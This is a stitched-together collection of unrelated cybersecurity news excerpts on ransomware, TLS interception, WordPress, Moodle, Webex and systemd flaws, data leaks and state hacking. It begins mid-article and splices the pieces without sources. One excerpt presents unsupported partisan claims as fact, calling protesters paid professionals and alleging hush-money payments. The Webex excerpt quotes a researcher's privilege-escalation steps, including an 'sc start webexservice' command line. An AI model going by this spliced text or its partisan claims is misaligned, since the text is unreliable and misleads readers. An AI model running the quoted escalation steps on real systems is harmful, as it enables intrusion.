This sad statistic explains why the majority of despaired victims of cybercrime fail to report it to the law enforcement agencies.
Attackers can easily rent a Ransomware-as-a-Service (RaaS) infrastructure for as low as $39.99 per month, making up to $195,000 of monthly profit without much effort in comparison to other niches of digital fraud and crime.
The business of ransomware has become so attractive that some cybercriminals don’t even bother to actually encrypt the data, but just extort money from their victims with fake malware.
The victims are so scared by media stories about ransomware, combined with law enforcement agencies’ inability to protect them or at least to punish the offenders, that they usually pay.
The new generation of ransomware attacks IoT and smart devices, locking not only mobiles and smart TVs, but also doors in hotels and air conditioning systems in luxury smart houses.
Criminals switch from file encryption to database encryption and web applications, demonstrating a great scalability of ransomware tactics.
To increase their profits, hacking teams behind the ransomware campaigns now threaten to send the victim’s sensitive data to all of their contacts instead of just deleting it.
Cryptocurrencies allow attackers to receive online payments almost without any risk of being traced and prosecuted.
Despite the media hype around blockchain’s ability to reinvent and improve the world, so far only the cybercriminals have entirely leveraged the full potential of this emerging technology.
A simple business model, high profits, accessibility and affordability of resources to deploy large-scale attacking campaigns, and low risks in comparison to other sectors of (cyber)crime, assure the flourishing future of ransomware.
All of this without mentioning the problem of global inequality actually causing the cybercrime, which I briefly described in Forbes recently.
Nonetheless, it does not mean that organizations should give up.
The FBI confirms the skyrocketing problem of ransomware, but suggests relying on prevention rather than paying ransom to the criminals.
PwC also suggests to plan and prepare the organization to this kind of incident in order to have internal capabilities to recover without suffering important financial losses.
Some cybersecurity vendors, like SentinelOne, contractually guarantee protection and provide a financial insurance for their clients.

Popular security products such as anti-viruses and middleboxes put customers at risk through poor transport layer security (TLS) interception implementations, researchers have found.
A group of researchers from United States universities as well as tech companies Google, Mozilla, and Cloudflare tested middleboxes - which act as network proxies for traffic analysis and content filtering - from A10, Blue Coat, Barracuda, CheckPoint, Cisco, Fortinet, Juniper, Microsoft, Sophos, Untangle, and WebTitan.
All but the BlueCoat device weakened connection security and introduced TLS vulnerabilities such as Logjam, weak export and RC4 ciphers, or didn't validate digital certificates properly.
The researchers also tested [pdf] 29 anti-viruses, and found 13 would intercept TLS connections.
Only Avast versions 10 and 11 for Windows did not reduce TLS connection security.
Interception of TLS connections involves security products injecting their own certificates in web browsers or devices in organisation networks.
This alllows them to terminate TLS connections, decrypt the traffic so as to look for malicious or disallowed content, and then re-initiate the TLS connection after analysis is complete.
Such interception is increasingly prevalent, the researchers said, meaning the security community is working at cross purposes - the attempts to detect and block harmful traffic dramatically reduces connection security, the researchers said.
""Many of the vulnerabilities we find in anti-virus products and corporate middleboxes — such as failing to validate certificates and advertising broken ciphers — are negligent and another data point in a worrying trend of security products worsening security rather than improving it,"" they wrote.
Compounding the problem, the researchers noted that while it was possible to adjust middlebox settings in many cases to avoid them degrading TLS security, their configuration was ""confusing, oftentimes with little or no documentation"".
""We note that the installation process for many of these proxies is convoluted, crash-prone, and at times, non-deterministic,"" they said.
Testing middleboxes with services such as Qualys SSL Labs, How's My SSL, and Bad SSL is a must for administrators, the researchers said.
There is no good reason for anti-virus vendors to intercept TLS since their software operates locally and already has access to the file system, browser memory, and any content loaded over HTTPS, they claimed.
The researchers disclosed the vulnerabilities in the security products to vendors, but said the reception to the reports varied greatly.
""In many cases, we received no response and in other cases, we were unable to convince manufacturers that TLS vulnerabilities such as Logjam required patching,"" they wrote.

Independent security researcher Dawid Golunski has released a proof-of-concept exploit code for an unauthenticated remote code execution vulnerability in WordPress 4.6 (CVE-2016-10033), and information about an unauthorized password reset zero-day vulnerability (CVE-2017-8295) in the latest version of the popular CMS.
The vulnerability exists in the PHPMailer library, and can be exploited by unauthenticated remote attackers to gain access to and compromise an target application server on which a vulnerable WordPress Core version is installed (in its default configuration).  
“No plugins or non-standard settings are required to exploit the vulnerability,” Golunski noted.

The hole has been responsibly disclosed to the WordPress Foundation, and has been plugged in January, with the release of WordPress 4.7.1. 
Still, according to the Foundation’s own numbers, nearly 11 percent of all WordPress installation out there are still stuck on the vulnerable version 4.6. 
And, as Golunski noted, it’s possible that older WordPress versions are also affected by the same flaw, so the percentage of vulnerable installations could be considerably higher:

Admins who still run these older versions of the popular CMS should upgrade to newer versions, ideally to the latest one (v4.7.4).
Still, even that might not be a guarantee against compromise, as Golunski has also publicly released information and POC code for an unauthorized password reset vulnerability (CVE-2017-8295) that the WordPress Foundation is yet to patch.
According to him and BeyondSecurity, whose SecuriTeam coordinated the disclosure of the flaw to the WordPress developers, the discovery of the vulnerability dates back to mid-2016. Golunski found it in version 4.3.1 of the CMS.
“WordPress has a password reset feature that contains a vulnerability which might in some cases allow attackers to get hold of the password reset link without previous authentication. Such attack could lead to an attacker gaining unauthorized access to a victim’s WordPress account,” BeyondSecurity explained.
“The vulnerability stems from WordPress using untrusted data by default when creating a password reset e-mail that is supposed to be delivered only to the e-mail associated with the owner’s account.”
Golunski says that the issue was reported to the WordPress security team multiple times, but they did not confirm whether it has been patched. 
He ultimately decided to publish his findings, and offer a temporary solution (“users can enable UseCanonicalName to enforce static SERVER_NAME value”).

IBM’s latest X-Force Threat Intelligence Index report reveals that more than 2.9 billion records were leaked through publicly disclosed incidents in 2017. While that sounds horribly bad, there’s a bright side to this stormy disclosure: the number is 25 percent lower than the amount of records leaked in 2016. Why? Because hackers are shifting over to ransomware. They’re becoming more focused on holding files hostage for money than on unleashing all that data to the dark markets. 
According to IBM, this shift to ransomware cost corporations more than $8 billion globally during 2017, a number derived from downtime, ransom payments, and other impacts on day-to-day business. The global logistics and transportation industries alone lost “millions of dollars” in revenue during 2017 due to ransomware attacks. 
Ransomware is a type of malware that infiltrates a network and encrypts files on connected PCs. These files become unrecoverable, and require a “key” generated by the hacker to be released from captivity. These keys are provided after a payment using cryptocurrency, adding to the overall cost corporations incur due to downtime. Hiring a third party to recover the files may or may not work, depending on the level of encryption. 
“With the potentially irreversible encryption lock of crypto-ransomware, victims without up-to-date backups often choose to pay the ransom their attackers demand,” the report states. “Losing one’s files on personal devices may cost a few hundred dollars, but that effect extends much further for organizations where infected users could cause the company to lose massive amounts of data, and possibly to have to pay the criminals considerable sums of money to get it back.” 
The report reveals that many organizations keep cryptocurrency on hand so they can resolve the problem quickly and reduce costly downtime. Law enforcement agencies discourage payments to hackers, but the rising ransomware “epidemic” is getting to the point where it may potentially cost corporations across the globe more than $11.5 billion annually by 2019, according to research by Cybersecurity Ventures. Malware, by contrast, values leaked personal data over the potential financial gain of locking sensitive data on corporate networks.

Over a dozen Democratic groups were approached with ransom demands by Russian hackers over protester funding information, according to a Monday report from Bloomberg.
The liberal Center for American Progress was one of the groups that was approached by what FBI officials report is the same group behind the Democratic National Committee hacks committed last year.
Many of the Trump protesters during the runup to the November election and after were not spontaneous citizens airing their grievances but were paid professionals.
Maybe that’s why so many of them wore masks, KKK style.
But the protesters weren’t the only ones who got paid…others who threatened to disclose these facts got paid $30,000 or up, to as much as $150,000 for their silence.
By Democrat groups who funded the protests, of course.
Or by paying the “ransom” did the Democrats actually secure the release of some child kidnapped by the Russians?

Things are getting messy at McDonald's in India, and that's not just for consumers of the Maharaja Mac - a double-stacked grilled chicken monstrosity with jalapenos and habanero sauce.
The flaw, found by payments company Fallible, exposed names, email addresses, phone numbers, home addresses and sometimes the coordinates of those homes, as well as links to social media profiles.
And Fallible contends that the leak still hasn't been properly fixed.
I queried McDonald's to see if it has tried to seal the hole in the API and also whether it has notified customers or regulators, but I didn't get an immediate response.
In a March 19 tweet, McDonald's didn't issue any clear answers, instead taking the well-trodden path of seeking to reassure users by highlighting what was not breached.
McDonald's has dabbled in home delivery in many countries since the early 1990s, attracting budget diners willing to risk the short half-life of its sandwiches and fries versus the vagaries of home delivery.
Fallible says it contacted McDonald's India on Feb 7, letting the fast-food chain know it could sequentially pull user information from the API using a curl request.
""An unprotected publicly accessible API endpoint for getting user details coupled with serially enumerable integers as customer IDs can be used to obtain access to all users personal information,"" Fallible writes in a blog post.
But the issue appeared to remain unfixed, so Fallible says McDonald's another email on March 7 asking for a status update.
Ten days later, it sent another email and received no response.
Fallible chose to go public with the issue in a March 18 blog post, prompting a public acknowledgement from McDonald's on Twitter the next day.
Fallible contends the issue hasn't been fixed, and it's unclear from McDonald's tweet if it was.
India doesn't have a specific law that requires mandatory reporting of data breaches.
But there are regulations and laws that cover the disclosure of personal information.

Six weeks after ransomware forced Colorado Department of Transportation’s back-end operations offline, the agency is back to 80 percent functionality — at an estimated cost of up to $1.5 million, according to the state.
Colorado officials said they never caved to the attacker’s demands to pay bitcoin in order to recover encrypted computer files. But clearing each computer took time and additional resources — including the Colorado National Guard — to investigate, contain and recover.
“We were able to recover from the SamSam attack relatively quickly due to our robust backup plan and our segmentation strategies,” Brandi Simmons, a spokesperson for Colorado’s Office of Information Technology, said in an email. “We are still capturing costs associated with the incident, but our estimate is between $1M and $1.5M.”
What started with a core team of 25 IT employees, Simmons said, ballooned to 150  “during the peak of the incident” — March 2-9. She added that others included CDOT, the FBI, state emergency operations and private companies. The million-dollar estimate includes only overtime pay and other unexpected costs. The state’s new backup system prevented data loss, but personal data on employees’ computers may not be recovered.
The cyberattack started around Feb 21 when a variant of the SamSam ransomware hijacked CDOT computer files. CDOT shut down more than 2,000 computers. Its employees had to use personal devices to check email. The state did not share the value of bitcoin that attackers demanded.
Elsewhere, SamSam attacked the city of Atlanta, debilitating computer systems that residents used to pay traffic tickets, report potholes and access Wi-Fi at the airport. The city hasn’t issued a public update since March 30, and a city spokesman said Thursday there is nothing new to share.
Attackers demanded $51,000 worth of bitcoin. Asked whether Atlanta has paid the ransom, spokeswoman Anne Torres said: “Unfortunately, we cannot comment further on the ransom.”
The rise of ransomware attacks has caused some to wonder whether it’s worth paying to avoid business outages — Hancock Health in Indiana paid $55,000 to get its files back. Dan Likarish, a computer professor at Denver’s Regis University, said there’s still a good reason not to do it.
“If you pay the ransom, you’re supporting the criminal,” said Likarish, adding there’s also no guarantee the attacker will return computer files intact. “The weasel answer? It’s a risk mitigation. That’s the way we label ourselves. We talk to upper management, present the business case that we’ve identified the problem, let’s just pay. That’s what a lot of hospitals have done. It’s not unusual to pay for the key and go about your business. It depends on how sophisticated your security staff is. If you don’t have it, what do you do? You’ve got to keep things running.”
Likarish said he was able to help with efforts to contain the CDOT attack and was in awe at how the state’s IT office swooped in and took command. While IT staff had already updated its own computer operations, not every state agency is on the same system, including CDOT.
“People are listening to them now,” Likarish said.

The bug affects all supported versions of Microsoft Word, but will be fixed this week.
Unlike most document-related vulnerabilities, this zero-day bug that has yet to be patched doesn't rely on macros -- in which Office typically warns users of risks when opening macro-enabled files.
Instead, the vulnerability is triggered when a victim opens a trick Word document, which downloads a malicious HTML application from a server, disguised to look like a Rich Text document file as a decoy.
The HTML application meanwhile downloads and runs a malicious script that can be used to stealthily install malware.
Researchers at McAfee, who first reported the discovery on Friday, said  because the HTML application is executable, the attacker can run code on the affected computer while evading memory-based mitigations designed to prevent these kinds of attacks.
The issue relates to the Windows Object Linking and Embedding (OLE) function, which allows an application to link and embed content to other documents, according to researchers.
The Windows OLE feature is used primarily in Office and Windows' in-built document viewer WordPad, but has been the cause of numerous vulnerabilities over the past few years.
The researchers recently focused a Black Hat talk on the Windows OLE attack surface.
The bug can be exploited on all versions of Office, including the latest Office 2016 running on Windows 10, and have spotted attacks in the wild since January.
A Microsoft spokesperson confirmed that the company will issue a fix for the bug on Tuesday as part of its monthly release of security fixes and patches.

A week ago the Moodle developers released updates for the still supported branches of the platform: 3.2.2, 3.1.5, 3.0.9 and 2.7.19.
The release notes mentioned that ""a number of security related issues were resolved,"" but didn't provide any additional details about their nature or impact.
The severity of the flaws became apparent Monday, when security researcher Netanel Rubin, who found the vulnerabilities, published a detailed blog post about them.
They don't seem too critical on their own, but when combined, they allow attackers to create hidden administrative accounts and execute malicious PHP code on the underlying server.
The exploit takes advantage of some false assumptions made by the developers, which Rubin described as a logic flaw, an Object Injection, a double SQL injection, and an overly permissive administrative dashboard.
The logic issue stems from the reimplementation of a certain function without taking into account decisions made by the original function's developers.
According to the researcher, it is the result of ""having too much code, too many developers and lacking documentation.""
""Keep in mind that logical vulnerabilities can and will occur in almost all systems featuring a large code base,"" Rubin said.
""Security issues in large code bases is, of course, not Moodle specific.""
Gaining administrative privileges on the Moodle platform is not only dangerous because attackers could install a PHP backdoor by uploading malicious plug-ins or templates, but also because Moodle installations store sensitive and private information about students taking online courses.

Cisco has released a new patch designed to fix a failed update which has not prevented the exploit of a severe Webex vulnerability.
The original security flaw, CVE-2018-15442, is present in the Cisco Webex Meetings Desktop App for Windows and is described as a bug which ""could allow an authenticated, local attacker to execute arbitrary commands as a privileged user.""
Cisco's original security update was published in October in order to remedy the flaw, in which a lack of validation for user-supplied parameters in the app could be harnessed to exploit the bug.
If an attacker is successful in utilizing the vulnerability, they can force the app to run arbitrary commands with user privileges.
""While the CVSS Attack Vector metric denotes the requirement for an attacker to have local access, administrators should be aware that in Active Directory deployments, the vulnerability could be exploited remotely by leveraging the operating system remote management tools,"" the company added.
Software releases prior to 33.6.4 -- alongside Cisco Webex Productivity Tools Releases 32.6.0 and later prior to 33.0.6 -- are impacted on Windows systems.
It was not long after the release of the first patch that researchers from SecureAuth deemed the original fix incomplete.
The original patch only forced the service to run files signed by Webex, but failed to account for DLL-based attacks, according to the team.
""The vulnerability can be exploited by copying to a local attacker controller folder, the ptUpdate.exe binary,"" the researchers said in an advisory. ""Also, a malicious dll must be placed in the same folder, named wbxtrace.dll. To gain privileges, the attacker must start the service with the command line: sc start webexservice install software-update 1 ""attacker-controlled-path"" (if the parameter 1 doesn't work, then 2 should be used).""
These findings were sent to Cisco, which acknowledged the DLL attack method. A new patch was then issued roughly a week after being informed of the issue.
""After an additional attack method was reported to Cisco, the previous fix for this vulnerability was determined to be insufficient,"" Cisco says. ""A new fix was developed, and the advisory was updated on November 27, 2018, to reflect which software releases include the complete fix.""

Cisco has released fixes for 34 flaws in its software, including 24 that affect its FXOS software for Firepower firewalls and NX-OS software for Nexus switches.
Cisco's June updates include fixes for five critical arbitrary code execution vulnerabilities affecting FXOS and NX-OS and 19 high-rated flaws affecting the software.
Four of the critical flaws affect FXOS and NX-OS Cisco Fabric Services, while the fifth one affects the NX-API feature of NX-OS. All have a CVSS v3 score of 9.8 out of a maximum of 10. 
Cisco Fabric Services facilitate distribution and synchronization of configuration data between Cisco devices on the same network.
Some of the flaws allow an unauthenticated, remote attack to execute arbitrary code and one allows an attacker to do so as root.
Multiple switches are vulnerable if they've been configured to use Cisco Fabric Services, including its Nexus 2000 series through to Nexus 9000 series switches, as well as Cisco's Firepower 4100 Series Next-Gen Firewalls and other hardware.
The insufficient input validation may occur when FXOS and NX-OS process Cisco Fabric Services packets received during distribution and synchronization.
There are various ways to exploit each of the flaws, depending on what Cisco Fabric Services distribution types have been configured.
For example, if Fibre Channel ports are configured as a distribution type for a device, the attack could occur via Fibre Channel over Ethernet (FCoE) or Fibre Channel over IP (FCIP).
Cisco has already rolled out fixes in some releases of FXOS and NX-OS.
Cisco posted a blog this week explaining why it often fixes bugs in IOS and NX-OS releases before disclosing them in an advisory.
It's a practice that appears to cause confusion for customers wondering why it hasn't told them fixed code has been available for several months before it discloses them. Cisco's answer is that some flaws affect more than 50 versions of its software.
""There have been some questions as to why creating fixes and releasing updates can take several weeks, or sometimes even months, before an advisory is published,"" Cisco's Customer Assurance Security Programs team wrote.
""In some cases, there is a large number of supported software versions to be updated. The number of affected versions that will be updated can range from single digits to nearly 50 or more. We are committed to issuing fixes for every one of those supported versions.""
""If we disclosed the vulnerability after only fixing one release, we would unnecessarily expose all customers running other releases to potential exploitation once details about the attack itself became public.""
There are also 10 medium-severity flaws, including one that affects some WebEx endpoints due to an already disclosed flaw in Nvidia's Tegra TX1 chips.

Western Digital My Cloud NAS devices have again been found wanting in the security department, as two set of researchers have revealed a number of serious flaws in the devices’ firmware.
WD My Cloud is meant to be a private cloud environment hosted at home or at a small organization’s office, and can be accessed either from a desktop located on the same network or remotely, with a smartphone, from wherever else in the world.
Users can interact with it either via the administrative user interface or an application (that uses a RESTful API).
Zenofex, a member of the Exploitee.rs team, revealed the existence of a login bypass issue, several command injection flaws, and a number of other bugs on Saturday.
Then, on Tuesday, researchers with the SEC Consult Vulnerability Lab published a security advisory warning about: 
“Due to [no anti-CSRF mechanisms], an attacker can force a user to execute any action through any script.
As the [OS command injection and unauthenticated arbitrary file upload vulnerabilities] do not need authentication, those can be exploited via CSRF over the Internet as well!”, the researchers noted.
SEC consult found the flaws in version 2.11.157 of the firmware on a My Cloud EX2 device, but they believe that other My Cloud devices are almost surely vulnerable as well, as the same (or pretty much the same) firmware is used on all of them.
Zenofex did his testing on a My Cloud PR4100 device, but also noted that other My Cloud devices are vulnerable to the same issues.
In the wake of these latest revelations, Securify researchers again pointed to their own research and security advisories from January 2017 dealing with the same or similar vulnerabilities, found on versions 2.21.119 and
2.21.126 of the firmware.
All three groups say that the issues have yet to be fixed by Western Digital.
SEC Consult researchers complained about the company slow reaction to their responsable disclosure efforts, while Zenofex noted that the company’s dismal reputation when it comes to patching reported issues.
So, he opted for public disclosure, in the hopes that this will push the company to pick up the pace.
“Ignoring these bugs would leave the vulnerable devices online for longer periods while responsible disclosure is worked out.
Instead we’re attempting to alert the community of the flaws and hoping that users remove their devices from any public facing portions of their networks, limiting access wherever possible,” he noted.

Researchers from Positive Technologies have unearthed a critical vulnerability (CVE-2017-6968) in Checker ATM Security by Spanish corporate group GMV Innovating Solutions. 
Checker ATM Security is a specialized security solution aimed at keeping ATMs safe from logical attacks. It does so by enforcing application whitelisting, full hard disk encryption, providing ACL-based control of process execution and resource access, enforcing security policies, restricting attempts to connect peripheral devices, and so on.
The found flaw can be exploited to remotely run code on a targeted ATM, increase the attacker’s privileges in the system, and compromise the machine completely.
“To exploit the vulnerability, a criminal would need to pose as the control server, which is possible via ARP spoofing, or by simply connecting the ATM to a criminal-controlled network connection,” researcher Georgy Zaytsev explained.
“During the process of generating the public key for traffic encryption, the rogue server can cause a buffer overflow on the ATM due to failure on the client side to limit the length of response parameters and send a command for remote code execution. This can give an attacker full control over the ATM and allow a variety of manipulations, including unauthorized money withdrawal”.”
When informed of the vulnerability and provided with test exploits, GMV confirmed its existence and that it affects versions 4.x and 5.x of the software, and ultimately pushed out a patch, which users are urged to install as soon as possible.
Exploitation not detected in the wild
A company spokesperson has made sure to point out that there is no indication that the vulnerability has been exploited in attacks in the wild. Also, that exploitation is not that easy, as the attacker must first gain access to the ATM network and log into the target system.
“Secondly, the attack is difficult to be systematically exploited in an ATM network. In order to exploit it, the attacker needs some memory address that are strongly dependent on Windows kernel version, while in Windows XP systems could be theoretically possible to take advantage of the vulnerability, in Windows 7 is almost impossible because those memory address are different in every windows installation,” the spokesperson told The Register.
Like any software, security software is not immune to vulnerabilities and can open systems to exploitation. While antivirus and other security solutions for personal computers are often scrutinized and tested for flaws by third-party researchers, specialized security software has not, so far, received that amount of attention.
So, it’s good to hear that some researchers have decided to focus on them, and that vendors are positively responding to vulnerability disclosures.

Security biz Qualys has revealed three vulnerabilities in a component of systemd, a system and service manager used in most major Linux distributions.
Patches for the three flaws – CVE-2018-16864, CVE-2018-16865, and CVE-2018-16866 – should appear in distro repos soon as a result of coordinated disclosure. However, Linux distributions such as Debian remain vulnerable at the moment, depending on the version you have installed.
""They're aware of the issues and they're releasing patches,"" said Jimmy Graham, director of product management at Qualys, in a phone interview with The Register. ""I don't believe Red Hat has released one but it should be coming shortly.""
The bugs were found in systemd-journald, a part of systemd that handles the collection and storage of log data. The first two CVEs refer to memory corruption flaws while the third involves an out of bounds error that can leak data.
CVE-2018-16864 can be exploited by malware running on a Linux box, or a malicious logged-in user, to crash and potentially hijack the systemd-journald system service, elevating access from user to root. CVE-2018-16865 and CVE-2018-16866 can be exploited together by a local attacker to crash or hijack the root-privileged journal service.
While systemd isn't universally beloved in the Linux community, Graham sees nothing unusual about the presence of the three flaws in the software. ""The noteworthiness to me is that it is very commonly found in most major distributions,"" he said.
Qualys contends all systemd-based Linux distros are vulnerable, though the vulnerabilities cannot be exploited in SUSE Linux Enterprise 15, openSUSE Leap 15.0, and Fedora 28 and 29 because their user-land code is compiled with GCC's -fstack-clash-protection option.
The security biz calls it a simplified stack clash – where the size of the stack gets changed to overlap with other memory areas – because it only requires the last two steps in a four step process: Clashing the stack with another memory region, moving the stack-pointer to the stack start, jumping over the stack guard-page into another memory region, and smashing the stack or memory space.
The third bug, CVE-2018-16866, appeared in June 2015 (systemd v221) and, Qualys says, was fixed inadvertently in August 2018. In code where the flaw still exists, it could allow an attacker to read out of bounds information, resulting in information leakage.
""The risk [of these issues] is a local privilege escalation to root,"" said Graham. ""It's something that should still be a concern because usually attackers don't just use one vulnerability to comprise a system. They often chain vulnerabilities together.""

Insecure backend databases and mobile apps are making for a dangerous combination, exposing an estimated 280 million records that include a treasure-trove of private user data. According to a report by Appthority, more than 1,000 apps it looked at on mobile devices leaked personally identifiable information that included passwords, location, VPN PINs, emails and phone numbers.
Appthority Mobile Threat Team called the vulnerability HospitalGown and said the culprit behind the threat are misconfigured backend storage platforms including Elasticsearch, Redis, MongoDB and MySQL.
“HospitalGown is a vulnerability to data exposure caused, not by any code in the app, but by the app developers’ failure to properly secure the backend servers with which the app communicates,” wrote the authors of the report released Wednesday.
According to Seth Hardy, director of security research, the problem is a byproduct of insecure database instillations that made headlines in February. That’s when misconfigured and insecure MongoDB, Hadoop and CouchDB installations became popular extortion targets for hackers who were scanning for vulnerable servers to attack.
The weak link in the chain when it comes to HospitalGown are the insecure servers that apps connect to, Hardy said. During the course of Appthority’s investigation, it found 21,000 open Elasticsearch servers, revealing more than 43 terabytes of exposed data.
In one scenario, the attacker looks for vulnerabilities in the space between the vendor’s mobile application and the app’s server side components, according to researchers. “The servers for most mobile applications are cloud based and accessible via the Internet, this allows a bad actor to skip the long and potentially many-layered ‘compromise’ stage of an attack, accessing company data directly from a database that is impossible for the enterprise to see or secure,” they wrote.
Researchers said vulnerable mobile apps it found ran the gamut, from office productivity, enterprise access management, games, dating to travel, flight and hotel applications. Any personal identifiable data a user shared with the app was vulnerable to possible exfiltration by a hacker.
“These servers were accessible from the Internet, lacked any means of authentication to prevent unwanted access to the data they contained, and failed to secure transport of data, including PII, using HTTPS: conventions,” according to the report. While this is a strictly a data security issue, Appthority said, attacks can quickly escalate and personal information could easily be leveraged in a spear phishing attack or brute force attack.
In its report, AppThority showed how a mobile VPN app called Pulse Workspace, used by enterprises, government agencies and service providers, leaked data. While Pulse Workspace created an API to secure front-end Elasticsearch access, the backend, and all of the app’s data records, were exposed and leaked Pulse customer data. AppThority notified Pulse Workspace and its customers of the vulnerability, which have since been fixed.

Appthority is careful to point out that of the platforms it examined – Elasticsearch, Redis, MongoDB, and MySQL – each had plugins to allow for proper public exposure on the internet. “Best practices on secure data stores is just not being adopted in too many cases,” Hardy said.
Elasticsearch, for example, has a bevy of security and data protection capabilities, such as being able to encrypt all the data that’s on the platform.
Increasing the risk of HospitalGown type-attacks is that fact that many apps Appthority looked at seemed benign in terms of shared user data. But, increasingly apps have advertising components that collect personal identifiable data that can be mined by hackers for phishing or ransomware attacks.
App developers and system administrators need to know where their data is stored and make sure it is secured, Hardy told Threatpost.

Schools and colleges are being warned to be on the lookout for ransomware attacks, after a wave of incidents where fraudsters attempted to trick educational establishments into opening dangerous email attachments.
What makes the attacks unusual, however, is just how the attackers tricked users into clicking on the malware-infected attachments.
As Action Fraud warns, confidence tricksters are phoning up schools and colleges pretending to be from the “Department of Education”.
The fraudsters request the email or phone number of the institution’s head teacher or financial administrator claiming they need to send guidance forms to the individual directly, as they contain sensitive information.
The emails, however, have a .ZIP file attached, which often contains a boobytrapped Word document or Excel spreadsheet which initiates the ransomware infection.
According to reports, up to £8,000 can be demanded for the safe decryption of files on the victims’ computers.
That is, of course, money that few schools can afford to spend.
Similar scams have posed as being from telecoms providers claiming to need to speak to the head teacher about “internet systems” or the Department of Work and Pensions.
In all cases the chances of the attack succeeding are increased by the fact that it is prefaced by a phone call.
We’re all very used to receiving suspicious emails in our inbox, but may be caught off guard if it is accompanied by an official-sounding phone call.
Action Fraud’s warning indicates that there are considerable amounts of money to be made by online criminals through ransomware attacks.
If there weren’t, they wouldn’t be prepared to go to such extreme efforts (such as making bogus phone calls) to increase the likelihood that their poisoned email attachments will be opened.
More money can typically be extorted from an organisation than an individual, with some corporations having paid out huge sums to blackmailers after having their data locked away through a ransomware attack.

A fraud chief at Britain’s biggest bank has admitted scam texts are now so sophisticated even he sometimes cannot tell if they are genuine.
Paul Davis, retail fraud director at Lloyds Banking Group, told Money Mail criminals can mimic the exact format of messages – which appear as though they are sent from a bank’s number using a technique called ‘spoofing’.
With fake banking texts now so difficult to spot, Mr Davis said customers should be taught how to respond to them to avoid being lured into a scam.
He added: ‘It’s the new “don’t talk to strangers”. 
'We teach children how to cross the road and we also need to teach everyone how to be aware of and stay safe from scams. 
It’s the new basic life safety advice we all need to know.’
Mr Davis said the key to avoiding falling for scams was to treat all messages with caution. 
‘It’s about what you say when you reply,’ he said. ‘Don’t ever give out your bank details and never give more than a simple answer like yes or no.’
The context of messages could be crucial, he explained. For example, when shopping online, if a customer is texted at the same time to confirm they intended to make this exact purchase, it is more likely to be genuine. 
But if a person receives a text out of the blue saying they have made a payment and can they confirm the purchase, it is more likely to be a scam.
Mr Davis accepted it was hard to know what messages to trust because even genuine ones can appear suspicious if they come from a variety of numbers.
‘If in doubt, don’t reply and ring the number on the back of your card,’ he said.
Customers were also warned never to click on links in texts or open email attachments claiming to be from the bank, as this could download malware which can spy on their phone or computer to find out their password. 
The Daily Mail is campaigning for fairer treatment for customers who fall prey to so-called authorised push payment fraud – sophisticated scams where victims are tricked into transferring money.
In the first six months of this year alone, around £145million was lost to this crime – of which only £31million was refunded.
There is currently no obligation on banks to reimburse customers who authorise payment in this type of fraud – and many say the victim is to blame for allowing the transaction to go through.
But consumer campaigners argue most scams are now so sophisticated even the savviest customers can fall for them.
Mr Davis said Lloyds examined each case on an individual basis and ‘often’ refunded victims as a gesture of goodwill. 
He said: ‘The key to stopping this type of fraud is working together. There’s a shared responsibility. The bank needs to do things to protect its customers but the victim also needs to take steps to protect themselves.’
He added: ‘Helping keep our customers’ money safe is our priority and we fully support Money Mail’s campaign.’
Yesterday, new rules were announced proposing greater protection for scam victims, in a victory for the Mail’s campaign.
The guidelines say banks must flash up warnings if a customer is making a questionable transfer and should carry out greater checks to ensure they are paying who they think they are. 
Banks should also delay payments if they are concerned they may be fraudulent and refund vulnerable victims, such as those who have been recently bereaved – even if the bank was not at fault.
But there was no agreement on who should bankroll the cost of refunds for victims – and some campaigners criticised the code for not going far enough.
The voluntary agreement between most banks and consumer groups follows an eight-month consultation by a steering group appointed by the Payment Systems Regulator, following a super-complaint by consumer group Which?

FireEye has identified a set of financially motivated intrusion operations being carried out by a threat actor we have dubbed FIN10. FIN10 is known for compromising networks, stealing sensitive data, and directly engaging victim executives and board members in an attempt to extort them into paying between 100 and 500 bitcoins (valued at between $125,000 and $620,000 as of mid April 2017).
For some victims that did not give into the demand, FIN10 escalated their operation and destroyed critical production systems and leaked stolen data to journalists in an attempt to increase visibility of the compromise and coerce victims into paying up.
The first known FIN10 operation was in 2013 and their operations have continued until at least 2016. To date, we are primarily aware of Canadian victims – specifically casinos and mining organizations. Given the release of sensitive victim data, extortion, and destruction of systems, FireEye considers FIN10 to be one of the most disruptive threat actors observed in the region so far.

Last spring, hackers got into the system at the ministry, which was then headed by now-Prime Minister Paolo Gentiloni, and the attacks carried on for more than four months but did not  gain access to classified information, the paper said.
“The Italian government had already informed (the paper) of what it is reporting today,” the source said in response to the article, noting that security had since been stepped up.
“These were not attacks on the encrypted computer system which carries the most important and sensitive information, but the email system for staff at the foreign ministry and embassies,” the source said.
Gentiloni, who took over as premier in December, was not affected by the attack, the Guardian quoted a government official as saying.
He avoided using email when he was serving as foreign minister, the paper said.
According to the Guardian, two people with knowledge of the attack said the Russian state was believed to have been behind it.
The source close to the ministry could not confirm this.
Cyber crime has come into sharp focus since United States intelligence agencies accused Russia of interfering in last year’s U.S. election.
The Russian foreign ministry did not immediately respond to a request for comment on Friday’s report.
The Kremlin has described allegations of Russian interference in the U.S. election as “fabricated” and “a witch hunt”.
An Italian government source told Reuters this year that the foreign ministry had been hacked in the past and that Rome suspected the perpetrators were Russian, but that it is impossible to say with certainty where such attacks came from.
Last month, an Italian brother and sister were arrested on suspicion of hacking into the emails of European Central Bank President Mario Draghi and thousands of others.
The police chief who conducted the investigation said there was no evidence they had acted on behalf of foreign states.

Atlanta mayor Keisha Bottoms said on Thursday, March 22, that hackers attacked the city’s network system and encrypted data. The details are somewhat slim for now, but hackers reportedly used the SamSam ransomware and demand around $51,000 in Bitcoin to unlock the city’s seized computers. Atlanta is currently working with the Department of Homeland Security, the FBI, Microsoft, and Cisco cybersecurity officials to determine the scope of the damage and regain control of the data held hostage. 
“Our Atlanta Information Management team is working diligently with support from Microsoft to resolve the issue,” the city’s official Twitter account states. “We are confident that our team of technology professionals will be able to restore applications soon. Our city website, Atlantaga.gov, remains accessible and we will provide updates as we receive them.” 
As of Thursday afternoon, the city said it faced outages on various “internal and customer facing applications,” such as means for accessing court-related information and paying bills. But the city itself isn’t exactly under siege: Airport, public safety, and water operations remain unaffected by the attack, and the city payroll wasn’t touched. The only bone Atlanta is throwing the public is that the attack affects “various city systems.” 
According to Atlanta’s newly appointed chief operating officer, Richard Cox, Atlanta Information Management officials were made aware of problems with internal and customer-facing applications at 5:40 a.m. Thursday. At the time, he acknowledged that the city fell prey to ransomware, but given the investigation is still ongoing, he couldn’t provide the extent of the damage.  
